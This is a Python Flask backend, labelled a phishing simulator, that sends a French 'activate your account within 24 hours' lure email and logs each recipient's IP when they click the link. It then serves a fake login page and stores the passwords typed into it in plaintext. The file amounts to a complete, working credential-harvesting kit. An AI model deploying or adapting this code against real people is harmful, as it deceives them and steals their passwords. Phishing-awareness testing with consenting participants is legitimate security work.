import uuid
from flask import Flask, render_template_string, redirect, url_for, request
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv
import os
from database.database import Database
from datetime import datetime


db = Database("database/activities.db")
load_dotenv()
app = Flask(__name__)


# Welcome page
@app.route('/')
def home():
  return "Phishing Simulator Backend Running!", 200

# Route to activate user (here we capture the UUID of the activation link)
@app.route('/click/<activation_token>/<target_email>')
def click(activation_token, target_email):
  user_ip = request.remote_addr
  activation_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
  
  db.add_conn(activation_token, target_email, user_ip, activation_time)
  
  return render_template_string(open("frontend/login_page.html").read(), activation_token=activation_token)


# Route to capture the password sent via the form
@app.route('/capture_password', methods=['POST'])
def capture_password():
  target_email = os.getenv("TARGET_EMAIL")
  password = request.form['password']
  activation_token = request.args.get('activation_token')
  
  db.add_captured_password(target_email, password)

  return render_template_string(open("frontend/thank_you.html").read(), activation_token=activation_token)



# Route to send email with activation link
@app.route('/send_email', methods=['POST'])
def send_email():
  mail_server = os.getenv("MAIL_SERVER")
  mail_port = os.getenv("MAIL_PORT")
  target_email = os.getenv("TARGET_EMAIL")
  mail_username = os.getenv("MAIL_USERNAME")
  mail_password = os.getenv("MAIL_PASSWORD")

  user_name = target_email.split('.')[0]
  subject = f"{user_name} activez votre compte sous 24h!" # TODO: Change at will
  activation_token = uuid.uuid4()
  activation_link = f"http://127.0.0.1:5000/click/{activation_token}/{target_email}"


  with open('frontend/email_styles.css', 'r') as f:
    email_css = f.read()

  # TODO: Change the email at will
  email_html = f"""
  <!DOCTYPE html>
  <html lang="fr">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email</title>
    <style>{email_css}</style>
  </head>
  <body>
    <div class="email-container">
      <h1>Bonjour {user_name},</h1>
      <p>Nous vous remercions de vous être inscrit(e) sur notre plateforme! Pour activer votre compte, veuillez cliquer sur le bouton ci-dessous :</p>
      <a href="{activation_link}" class="btn">Activer mon compte</a>
      <p><br>Cordialement,<br>L'équipe Support</p>
    </div>
  </body>
  </html>
  """


  msg = MIMEMultipart()
  msg['From'] = mail_username
  msg['To'] = target_email
  msg['Subject'] = subject

  email_html = render_template_string(email_html, user_name=user_name, activation_link=activation_link)

  msg.attach(MIMEText(email_html, 'html'))

  server = smtplib.SMTP(mail_server, mail_port)
  server.starttls()
  server.login(mail_username, mail_password)
  server.sendmail(msg['From'], msg['To'], msg.as_string())
  server.quit()

  return "Email sent successfully!\n"


if __name__ == '__main__':
  app.run(debug=True)